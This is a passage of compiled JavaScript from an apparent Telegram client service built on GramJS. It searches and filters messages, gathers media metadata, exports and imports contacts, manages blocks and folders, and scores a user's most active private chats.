            this.logger.info(this.phoneNumber, type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: (0, big_integer_1.default)(0),
            };
            let messages = [];
            let count = 0;
            this.logger.info(this.phoneNumber, "Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                this.logger.info(this.phoneNumber, "Performing search in chat: ", chatId);
                const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages;
            }
            else {
                this.logger.info(this.phoneNumber, "Performing global search");
                const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                    ...searchQuery,
                    offsetRate: 0,
                    offsetPeer: new telegram_1.Api.InputPeerEmpty(),
                    offsetId: 0,
                    usersOnly: true
                }));
                if (!('messages' in result)) {
                    return {};
                }
                this.logger.info(this.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${result["count"]}`);
                count = result["count"] || 0;
                messages = result.messages;
            }
            if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
                this.logger.info(this.phoneNumber, "Text Filter");
                messages = messages.filter((msg) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ];
                if (message.media && message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const document = message.media.document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof telegram_1.Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !(0, utils_1.contains)(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                }
                else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = (0, utils_1.contains)(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));
            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            };
            finalResult[`${type}`] = localResult;
        }
        return finalResult;
    }
    async getAllMediaMetaData(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['all'], startDate, endDate, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        let allMedia = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;
        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types: hasAll ? ['all'] : typesToFetch,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId > 0 ? lastOffsetId : undefined,
                minId
            });
            this.logger.info(this.phoneNumber, `hasMore: ${response.pagination.hasMore}, Total: ${response.pagination.total}, nextMaxId: ${response.pagination.nextMaxId}`);
            if (response.groups) {
                const items = response.groups.flatMap(group => group.items || []);
                allMedia = allMedia.concat(items);
            }
            else if (response.data) {
                allMedia = allMedia.concat(response.data);
            }
            if (!response.pagination.hasMore || !response.pagination.nextMaxId) {
                hasMore = false;
                this.logger.info(this.phoneNumber, 'No more messages to fetch');
            }
            else {
                lastOffsetId = response.pagination.nextMaxId;
                this.logger.info(this.phoneNumber, `Fetched ${allMedia.length} messages so far`);
            }
            await (0, Helpers_1.sleep)(3000);
        }
        if (hasAll) {
            const grouped = allMedia.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => ({
                type: mediaType,
                count: grouped[mediaType]?.length || 0,
                items: grouped[mediaType] || [],
                pagination: {
                    page: 1,
                    limit: grouped[mediaType]?.length || 0,
                    total: grouped[mediaType]?.length || 0,
                    totalPages: 1,
                    hasMore: false
                }
            }));
            return {
                groups,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            return {
                data: allMedia,
                pagination: {
                    page: 1,
                    limit: allMedia.length,
                    total: allMedia.length,
                    totalPages: 1,
                    hasMore: false
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async getFilteredMedia(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const hasAll = types.includes('all');
        const typesToFetch = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all');
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);
        const query = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };
        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getFilteredMedia", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
        const filteredMessages = messages.filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return typesToFetch.includes(mediaType);
        });
        this.logger.info(this.phoneNumber, `Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await this.processWithConcurrencyLimit(filteredMessages, async (message) => {
            const thumbBuffer = await this.getThumbnailBuffer(message);
            const mediaDetails = this.getMediaDetails(message.media);
            let fileSize;
            let mimeType;
            let filename;
            let width;
            let height;
            let duration;
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const photo = message.photo;
                mimeType = 'image/jpeg';
                filename = 'photo.jpg';
                if (photo?.sizes && photo.sizes.length > 0) {
                    const largestSize = photo.sizes[photo.sizes.length - 1];
                    if (largestSize && 'size' in largestSize) {
                        fileSize = largestSize.size;
                    }
                    if (largestSize && 'w' in largestSize) {
                        width = largestSize.w;
                    }
                    if (largestSize && 'h' in largestSize) {
                        height = largestSize.h;
                    }
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const doc = message.media.document;
                if (doc instanceof telegram_1.Api.Document) {
                    fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                    mimeType = doc.mimeType;
                    const fileNameAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    filename = fileNameAttr?.fileName;
                    const videoAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                    if (videoAttr) {
                        width = videoAttr.w;
                        height = videoAttr.h;
                        duration = videoAttr.duration;
                    }
                    const audioAttr = doc.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeAudio);
                    if (audioAttr && !duration) {
                        duration = audioAttr.duration;
                    }
                }
            }
            let dateValue;
            const msgDate = message.date;
            if (msgDate) {
                if (typeof msgDate === 'number') {
                    dateValue = msgDate;
                }
                else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                    const dateObj = msgDate;
                    dateValue = Math.floor(dateObj.getTime() / 1000);
                }
                else {
                    dateValue = Math.floor(Date.now() / 1000);
                }
            }
            else {
                dateValue = Math.floor(Date.now() / 1000);
            }
            return {
                messageId: message.id,
                chatId: chatId,
                type: this.getMediaType(message.media),
                date: dateValue,
                caption: message.message || '',
                thumbnail: thumbBuffer ? `data:image/jpeg;base64,${thumbBuffer.toString('base64')}` : undefined,
                fileSize,
                mimeType,
                filename,
                width,
                height,
                duration,
                mediaDetails: mediaDetails || undefined
            };
        }, this.THUMBNAIL_CONCURRENCY_LIMIT, this.THUMBNAIL_BATCH_DELAY_MS);
        if (hasAll) {
            const grouped = mediaData.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {});
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;
                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });
            const totalItems = mediaData.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const overallLastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && mediaData.length > 0 ? overallFirstMessageId : undefined;
            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
        else {
            const total = mediaData.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;
            const lastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            const prevMaxId = maxId && mediaData.length > 0 ? firstMessageId : undefined;
            return {
                data: mediaData,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }
    async safeGetEntity(entityId) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            return await this.client.getEntity(entityId);
        }
        catch (error) {
            this.logger.info(this.phoneNumber, `Failed to get entity directly for ${entityId}, searching in dialogs...`);
            try {
                for await (const dialog of this.client.iterDialogs({})) {
                    const entity = dialog.entity;
                    const dialogId = entity.id.toString();
                    if (dialogId === entityId.toString()) {
                        return entity;
                    }
                    if (dialogId.startsWith('-100')) {
                        if (dialogId.substring(4) === entityId.toString()) {
                            return entity;
                        }
                    }
                    else {
                        if (`-100${dialogId}` === entityId.toString()) {
                            return entity;
                        }
                    }
                }
                this.logger.info(this.phoneNumber, `Entity ${entityId} not found in dialogs either`);
                return null;
            }
            catch (dialogError) {
                this.logger.error(this.phoneNumber, 'Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }
    generateCSV(contacts) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));
        return [header, ...rows].join('\n');
    }
    generateVCard(contacts) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }
    async exportContacts(format, includeBlocked = false) {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }
        if (format === 'csv') {
            const csvData = contacts.map((contact) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p) => p.id.toString() === contact.id.toString()) : false
            }));
            return this.generateCSV(csvData);
        }
        else {
            return this.generateVCard(contacts);
        }
    }
    async importContacts(data) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(data.map(async (contact) => {
            try {
                await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                    contacts: [new telegram_1.Api.InputPhoneContact({
                            clientId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000)),
                            phone: contact.phone,
                            firstName: contact.firstName,
                            lastName: contact.lastName || ''
                        })]
                }));
                return { success: true, phone: contact.phone };
            }
            catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));
        return results;
    }
    async manageBlockList(userIds, block) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(userIds.map(async (userId) => {
            try {
                if (block) {
                    await this.client.invoke(new telegram_1.Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                else {
                    await this.client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            }
            catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));
        return results;
    }
    async getContactStatistics() {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        const onlineContacts = contacts.filter((c) => c.status && 'wasOnline' in c.status);
        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c) => c.phone).length,
            mutual: contacts.filter((c) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }
    async createChatFolder(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const folder = new telegram_1.Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new telegram_1.Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });
        await this.client.invoke(new telegram_1.Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));
        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }
    async getChatFolders() {
        if (!this.client)
            throw new Error('Client not initialized');
        const filters = await this.client.invoke(new telegram_1.Api.messages.GetDialogFilters());
        return (filters.filters || []).map((filter) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }
    async sendMediaBatch(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(options.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const file = new uploads_1.CustomFile(item.fileName || `media.${this.getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = item.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(item.type),
                    attributes: this.getMediaAttributes(item)
                });
            return new telegram_1.Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }
    getMimeType(type) {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }
    getMediaAttributes(item) {
        const attributes = [];
        if (item.fileName) {
            attributes.push(new telegram_1.Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }
        if (item.type === 'video') {
            attributes.push(new telegram_1.Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }
        return attributes;
    }
    async editMessage(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new uploads_1.CustomFile(`media.${this.getMediaExtension(options.media.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = options.media.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }
        if (options.text) {
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }
        throw new Error('Either text or media must be provided');
    }
    async getChats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const dialogs = [];
        const limit = options.limit || 100;
        let count = 0;
        for await (const dialog of this.client.iterDialogs({
            ...options,
            limit
        })) {
            dialogs.push(dialog);
            count++;
            if (count >= limit)
                break;
        }
        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof telegram_1.Api.User ? 'user' :
                    entity instanceof telegram_1.Api.Chat ? 'group' :
                        entity instanceof telegram_1.Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }
    async updateChatSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const chat = await this.client.getEntity(settings.chatId);
        const updates = [];
        if (settings.title) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }
        if (settings.about) {
            updates.push(this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }
        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: chat,
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }
        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }
        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }
        if (settings.username) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }
        await Promise.all(updates);
        return true;
    }
    async getMessageStats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = options.fromDate || new Date();
        const startDate = new Date(now);
        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }
        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });
        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };
        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;
            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            }
            else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }
            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }
        return stats;
    }
    async getTopPrivateChats(limit = 10) {
        if (!this.client)
            throw new Error('Client not initialized');
        const clampedLimit = Math.max(1, Math.min(50, limit || 10));
        this.logger.info(this.phoneNumber, `Starting getTopPrivateChats analysis with limit=${clampedLimit}...`);
        const startTime = Date.now();
        const now = Date.now();
        const nowSeconds = Math.floor(now / 1000);
        const weights = {
            videoCall: 5,
            incomingCall: 4,
            outgoingCall: 3,
            sharedVideo: 12,
            sharedPhoto: 10,
            textMessage: 1,
            unreadMessages: 1,
            recentActivity: 1,
        };
        const ACTIVITY_WINDOWS = {
            recent: 7,
            active: 30,
            dormant: 90
        };
        const getTimeDecayMultiplier = (daysSinceActivity) => {
            if (daysSinceActivity <= 1)
                return 1.5;
            if (daysSinceActivity <= 7)
                return 1.2;
            if (daysSinceActivity <= 30)
                return 1.0;
            if (daysSinceActivity <= 90)
                return 0.7;
            return 0.3;
        };
        this.logger.info(this.phoneNumber, 'Fetching dialogs with metadata...');
        const dialogs = [];
        for await (const dialog of this.client.iterDialogs({
            limit: 200
        })) {
            dialogs.push(dialog);
        }
        this.logger.info(this.phoneNumber, `Found ${dialogs.length} total dialogs`);
        const privateChats = dialogs
            .filter(dialog => {
            if (!dialog.isUser || !(dialog.entity instanceof telegram_1.Api.User))
                return false;
            const user = dialog.entity;
            if (user.bot || user.fake)
                return false;
            const userId = user.id.toString();
            if (userId === "777000" || userId === "42777")
                return false;
            return true;
        })
            .sort((a, b) => {
            const dateA = a.message?.date || 0;
            const dateB = b.message?.date || 0;
            return dateB - dateA;
        });
        this.logger.info(this.phoneNumber, `Found ${privateChats.length} valid private chats after smart filtering`);
        const callLogs = await this.getCallLogsInternal();
        let selfChatData = null;
        try {
            const me = await this.getMe();
            const selfChatId = me.id.toString();
            this.logger.info(this.phoneNumber, `Processing self chat (me) with chatId: ${selfChatId}`);
            let messageCount = 0;
            let ownMessageCount = 0;
            let replyChainCount = 0;
            const messageDates = [];
            const mediaStats = { photos: 0, videos: 0 };
            for await (const message of this.client.iterMessages('me', {
                limit: 500,
                reverse: false
            })) {
                messageCount++;
                if (message.date) {
                    messageDates.push(message.date * 1000);
                }
                if (message.out) {
                    ownMessageCount++;
                }
                if (message.replyTo) {
                    replyChainCount++;
                }
                if (message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                    if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                        mediaStats.photos++;
                    }
                    else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                        const document = message.media.document;
                        if (document instanceof telegram_1.Api.Document) {
                            const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                            if (isVideo) {
                                mediaStats.videos++;
                            }
                        }
                    }
                }
            }
            let totalMessages = messageCount;
            try {
                const firstBatch = await this.client.getMessages('me', { limit: 1 });
                if (firstBatch.total) {
                    totalMessages = firstBatch.total;
                }
            }
            catch (totalError) {
            }
            const lastMessageDate = messageDates.length > 0 ? Math.max(...messageDates) : now;
            const daysSinceLastActivity = (now - lastMessageDate) / (1000 * 60 * 60 * 24);
            const timeDecay = getTimeDecayMultiplier(daysSinceLastActivity);
            const mutualEngagementScore = messageCount > 0 ? Math.min(1.5, (ownMessageCount / messageCount) * 2) : 1.0;
            const conversationDepthScore = messageCount > 0 ? Math.min(1.3, 1 + (replyChainCount / messageCount) * 0.3) : 1.0;
            const callStats = {
                total: 0,
                incoming: { total: 0, audio: 0, video: 0 },
                outgoing: { total: 0, audio: 0, video: 0 }
            };
            const baseScore = (mediaStats.videos * weights.sharedVideo +
                mediaStats.photos * weights.sharedPhoto +
                totalMessages * weights.textMessage);
            const interactionScore = baseScore * timeDecay * mutualEngagementScore * conversationDepthScore;
            let engagementLevel;
            if (daysSinceLastActivity <= ACTIVITY_WINDOWS.recent) {
                engagementLevel = 'recent';
            }
            else if (daysSinceLastActivity <= ACTIVITY_WINDOWS.active) {
                engagementLevel = 'active';
            }
            else {
                engagementLevel = 'dormant';
            }
            const totalActivity = (mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) +
                totalMessages * weights.textMessage;
            const activityBreakdown = totalActivity > 0 ? {
                videoCalls: 0,
                audioCalls: 0,
                mediaSharing: Math.round(((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) / totalActivity) * 100),
                textMessages: Math.round((totalMessages * weights.textMessage / totalActivity) * 100)
            } : {
                videoCalls: 0,
                audioCalls: 0,
                mediaSharing: 0,
                textMessages: 100
            };
            selfChatData = {
                chatId: 'me',
                username: me.username,
                firstName: me.firstName || 'Saved Messages',
                lastName: me.lastName,
                totalMessages,
                interactionScore: Math.round(interactionScore * 100) / 100,
                engagementLevel,
                lastActivityDays: Math.round(daysSinceLastActivity * 10) / 10,
                calls: callStats,
                media: mediaStats,
                activityBreakdown
            };
            this.logger.info(this.phoneNumber, `Self chat processed - Score: ${selfChatData.interactionScore}, Total Messages: ${totalMessages}`);
        }
        catch (selfChatError) {
            this.logger.warn(this.phoneNumber, `Error processing self chat, will continue without it:`, selfChatError);
        }
        const batchSize = 10;
        const chatStats = [];
        const CHAT_TIMEOUT_MS = 30000;
        const BATCH_DELAY_MS = 100;
        const targetCandidates = clampedLimit * 2;
        for (let i = 0; i < privateChats.length; i += batchSize) {
            if (chatStats.length >= targetCandidates) {
                this.logger.info(this.phoneNumber, `Early termination: Found ${chatStats.length} candidates (target: ${targetCandidates})`);
                break;
            }
            this.logger.info(this.phoneNumber, `Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)} (${chatStats.length} candidates so far)`);
            const batch = privateChats.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (dialog) => {
                const processingStart = Date.now();
                const chatId = dialog.entity.id.toString();
                const user = dialog.entity;
                const lastMessageDate = dialog.message?.date ? dialog.message.date * 1000 : now;
                const daysSinceLastActivity = (now - lastMessageDate) / (1000 * 60 * 60 * 24);
                const unreadCount = dialog.unreadCount || 0;
                const isPinned = dialog.pinned || false;
                this.logger.info(this.phoneNumber, `Processing chat ${chatId} (${user.firstName || 'Unknown'}) - Last activity: ${daysSinceLastActivity.toFixed(1)} days ago, Unread: ${unreadCount}`);
                try {
                    const chatProcessingPromise = (async () => {
                        let messageCount = 0;
                        let ownMessageCount = 0;
                        let replyChainCount = 0;
                        let recentMediaCount = 0;
                        const messageDates = [];
                        const mediaStats = { photos: 0, videos: 0 };
                        for await (const message of this.client.iterMessages(chatId, {
                            limit: 400,
                            reverse: false
                        })) {
                            messageCount++;
                            if (message.date) {
                                messageDates.push(message.date * 1000);
                            }
                            if (message.out) {
                                ownMessageCount++;
                            }
                            if (message.replyTo) {
                                replyChainCount++;
                            }
                            if (message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                                recentMediaCount++;
                                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                                    mediaStats.photos++;
                                }
